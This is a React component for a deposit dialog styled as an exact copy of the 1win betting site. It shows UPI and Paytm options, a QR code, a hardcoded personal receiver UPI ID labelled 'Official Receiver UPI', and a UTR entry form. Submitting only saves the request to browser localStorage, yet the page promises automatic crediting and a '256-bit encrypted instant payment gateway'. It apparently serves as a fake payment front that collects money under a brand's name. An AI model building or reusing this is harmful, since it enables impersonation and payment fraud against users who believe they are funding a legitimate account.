import React, { useState } from "react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Copy, Check, QrCode, ArrowLeft, ChevronDown, ShieldCheck } from "lucide-react";
import { toast } from "sonner";
import { useVault } from "@/lib/vault-store";

export interface TopUpModalProps {
  isOpen?: boolean;
  open?: boolean;
  onClose?: () => void;
  onOpenChange?: (open: boolean) => void;
  onSuccess?: (amount: number) => void;
}

type TabType = "fiat" | "crypto";
type MethodType = "paytm_app" | "phonepe" | "paytm" | "upi" | "icash";

const METHODS = [
  {
    id: "paytm_app" as MethodType,
    name: "PAY TM",
    subtitle: "Paytm pay in app",
    badge: "FAST",
    color: "text-[#00baf2]",
    iconBg: "bg-[#00baf2]/10",
  },
  {
    id: "phonepe" as MethodType,
    name: "PhonePe",
    subtitle: "Direct App Transfer",
    color: "text-[#5f259f]",
    iconBg: "bg-[#5f259f]/10",
  },
  {
    id: "paytm" as MethodType,
    name: "PAY TM",
    subtitle: "UPI & Wallet",
    color: "text-[#002e6e]",
    iconBg: "bg-[#002e6e]/20",
  },
  {
    id: "upi" as MethodType,
    name: "UPI",
    subtitle: "GooglePay / BHIM",
    color: "text-emerald-400",
    iconBg: "bg-emerald-500/10",
  },
  {
    id: "icash" as MethodType,
    name: "icash.one",
    subtitle: "Instant Deposit",
    color: "text-rose-400",
    iconBg: "bg-rose-500/10",
  },
];

export function TopUpModal(props: TopUpModalProps) {
  const isModalOpen = props.isOpen ?? props.open ?? false;
  const handleClose = () => {
    if (props.onClose) props.onClose();
    if (props.onOpenChange) props.onOpenChange(false);
    setSelectedMethod(null);
  };

  const { user, payment } = useVault();
  const [activeTab, setActiveTab] = useState<TabType>("fiat");
  const [selectedMethod, setSelectedMethod] = useState<MethodType | null>(null);
  const [amount, setAmount] = useState("500");
  const [utr, setUtr] = useState("");
  const [copied, setCopied] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  const upiId = payment?.upiId || "8317848513@ybl";
  const merchantName = payment?.displayName || "1WIN SECURE VAULT";

  const handleCopy = () => {
    navigator.clipboard.writeText(upiId);
    setCopied(true);
    toast.success("UPI ID copied!");
    setTimeout(() => setCopied(false), 2000);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (!utr || utr.trim().length < 6) {
      toast.error("Please enter a valid 12-digit UTR/Ref number.");
      return;
    }

    setSubmitting(true);

    try {
      const parsedAmount = parseFloat(amount);
      const phone =
        localStorage.getItem("win1_user_phone") ||
        user?.email ||
        user?.id ||
        "8317848513";

      const newReq = {
        id: "dep_" + Date.now(),
        kind: "deposit",
        amount: parsedAmount,
        status: "pending",
        phone,
        utr: utr.trim(),
        method: selectedMethod,
        createdAt: new Date().toISOString(),
      };

      const existing = JSON.parse(
        localStorage.getItem("win1_vault_requests") || "[]"
      );
      localStorage.setItem(
        "win1_vault_requests",
        JSON.stringify([newReq, ...existing])
      );

      toast.success("Deposit request sent! Account will credit automatically after verification.");
      if (props.onSuccess) props.onSuccess(parsedAmount);
      setUtr("");
      handleClose();
    } catch {
      toast.error("Failed to process deposit.");
    } finally {
      setSubmitting(false);
    }
  };

  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=upi://pay?pa=${encodeURIComponent(
    upiId
  )}%26pn=${encodeURIComponent(merchantName)}%26am=${amount}%26cu=INR`;

  return (
    <Dialog open={isModalOpen} onOpenChange={(val) => !val && handleClose()}>
      <DialogContent className="max-w-sm rounded-3xl border border-slate-800 bg-[#0d121c] p-0 text-white shadow-2xl overflow-hidden font-sans">
        
        {/* Modal Header */}
        <div className="flex items-center justify-between border-b border-slate-800/80 px-4 py-3">
          <div className="flex items-center gap-2">
            {selectedMethod && (
              <button
                onClick={() => setSelectedMethod(null)}
                className="p-1 text-slate-400 hover:text-white"
              >
                <ArrowLeft className="size-4" />
              </button>
            )}
            <DialogTitle className="text-base font-black text-white">Deposit</DialogTitle>
          </div>
          <button onClick={handleClose} className="text-xs text-slate-400 hover:text-white">
            ✕
          </button>
        </div>

        <div className="p-4 space-y-4">
          {/* Fiat / Crypto 1win Switcher */}
          <div className="grid grid-cols-2 rounded-xl bg-[#141b29] p-1 border border-slate-800">
            <button
              onClick={() => {
                setActiveTab("fiat");
                setSelectedMethod(null);
              }}
              className={`flex items-center justify-center gap-2 rounded-lg py-1.5 text-xs font-black transition-all ${
                activeTab === "fiat"
                  ? "bg-[#1c2438] text-white shadow-md"
                  : "text-slate-400 hover:text-slate-200"
              }`}
            >
              <span className="size-2 rounded-full bg-emerald-400" />
              Fiat
            </button>
            <button
              onClick={() => {
                setActiveTab("crypto");
                setSelectedMethod(null);
              }}
              className={`flex items-center justify-center gap-2 rounded-lg py-1.5 text-xs font-black transition-all ${
                activeTab === "crypto"
                  ? "bg-[#1c2438] text-white shadow-md"
                  : "text-slate-400 hover:text-slate-200"
              }`}
            >
              <span className="size-2 rounded-full bg-amber-400" />
              Crypto
            </button>
          </div>

          {activeTab === "crypto" ? (
            <div className="rounded-2xl border border-slate-800 bg-[#101624] p-6 text-center">
              <p className="text-xs text-slate-400 font-bold">
                Crypto gateways (USDT TRC20, BTC, ETH) activating in next build.
              </p>
              <Button
                size="sm"
                onClick={() => setActiveTab("fiat")}
                className="mt-3 bg-blue-600 text-xs font-bold"
              >
                Use UPI / Fiat
              </Button>
            </div>
          ) : !selectedMethod ? (
            /* Methods Grid (Exact 1win style) */
            <div className="space-y-3">
              {/* Currency Dropdown Bar */}
              <div className="flex items-center justify-between rounded-xl border border-slate-800 bg-[#121826] px-3 py-2.5">
                <div className="flex items-center gap-2">
                  <span className="flex size-5 items-center justify-center rounded-full bg-emerald-500/20 text-xs font-bold text-emerald-400">
                    ₹
                  </span>
                  <span className="text-xs font-black text-slate-200">Indian rupee</span>
                </div>
                <ChevronDown className="size-4 text-slate-500" />
              </div>

              {/* 1win Payment Provider Cards */}
              <div className="grid grid-cols-2 gap-2.5">
                {METHODS.map((m) => (
                  <div
                    key={m.id}
                    onClick={() => setSelectedMethod(m.id)}
                    className="relative flex flex-col justify-between rounded-2xl border border-slate-800/90 bg-[#121826] p-3 cursor-pointer transition-all hover:border-blue-500/40 active:scale-95 shadow-md"
                  >
                    {m.badge && (
                      <span className="absolute -top-1.5 right-2 rounded bg-blue-600 px-1.5 py-0.2 text-[8px] font-black uppercase text-white shadow">
                        {m.badge}
                      </span>
                    )}

                    <div className="flex items-center gap-2 mb-2">
                      <div
                        className={`size-7 rounded-lg ${m.iconBg} flex items-center justify-center font-black text-[11px] ${m.color}`}
                      >
                        {m.name.slice(0, 2)}
                      </div>
                      <span className="text-xs font-black tracking-tight text-white">
                        {m.name}
                      </span>
                    </div>

                    <span className="text-[10px] text-slate-400 font-medium truncate">
                      {m.subtitle}
                    </span>
                  </div>
                ))}
              </div>
            </div>
          ) : (
            /* Selected Payment Flow (QR + Copy + UTR) */
            <div className="space-y-3">
              {/* Amount Quick Picker */}
              <div>
                <label className="text-[10px] uppercase font-bold text-slate-400">
                  Select Deposit Amount
                </label>
                <div className="mt-1.5 grid grid-cols-4 gap-1.5">
                  {["200", "500", "1000", "2500"].map((amt) => (
                    <button
                      key={amt}
                      type="button"
                      onClick={() => setAmount(amt)}
                      className={`rounded-lg py-1.5 text-xs font-black border transition-all ${
                        amount === amt
                          ? "bg-blue-600 border-blue-500 text-white shadow"
                          : "bg-[#141b29] border-slate-800 text-slate-300"
                      }`}
                    >
                      ₹{amt}
                    </button>
                  ))}
                </div>
                <Input
                  type="number"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="Custom Amount"
                  className="mt-2 h-9 border-slate-800 bg-[#121826] text-xs text-white"
                />
              </div>

              {/* Dynamic QR Box */}
              <div className="flex flex-col items-center justify-center rounded-2xl border border-slate-800 bg-[#101624] p-3 text-center">
                <img
                  src={qrUrl}
                  alt="UPI QR Code"
                  className="size-36 rounded-xl border border-white/10 bg-white p-1 shadow-md"
                />
                <p className="mt-2 text-[10px] text-slate-400 font-bold">
                  Scan QR with any UPI App (Paytm, PhonePe, GPay)
                </p>
              </div>

              {/* UPI ID Copy Field */}
              <div className="flex items-center justify-between rounded-xl border border-slate-800 bg-[#121826] p-2.5">
                <div className="truncate pr-2">
                  <span className="text-[9px] font-bold text-slate-400 uppercase block">
                    Official Receiver UPI
                  </span>
                  <span className="text-xs font-mono font-black text-white">{upiId}</span>
                </div>
                <Button
                  size="sm"
                  type="button"
                  onClick={handleCopy}
                  className="h-8 bg-blue-600 hover:bg-blue-500 px-3 text-xs font-bold text-white"
                >
                  {copied ? <Check className="size-3.5" /> : <Copy className="size-3.5" />}
                </Button>
              </div>

              {/* UTR Form */}
              <form onSubmit={handleSubmit} className="space-y-3 pt-1">
                <div>
                  <label className="text-[10px] uppercase font-bold text-slate-400 block mb-1">
                    12-digit UTR / Ref / Transaction ID
                  </label>
                  <Input
                    type="text"
                    value={utr}
                    onChange={(e) => setUtr(e.target.value)}
                    placeholder="Enter 12-digit UTR after payment"
                    className="h-9 border-slate-800 bg-[#121826] text-xs font-mono text-white"
                    required
                  />
                </div>

                <Button
                  type="submit"
                  disabled={submitting}
                  className="w-full h-10 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-xs font-black uppercase text-white shadow-lg active:scale-95 transition-all"
                >
                  {submitting ? "Confirming..." : `Confirm Deposit ₹${amount}`}
                </Button>
              </form>
            </div>
          )}

          {/* Secure Guarantee Strip */}
          <div className="flex items-center justify-center gap-1.5 pt-1 text-[10px] text-slate-500">
            <ShieldCheck className="size-3.5 text-emerald-500" />
            <span>256-bit encrypted instant payment gateway</span>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
}

export default TopUpModal;
                  
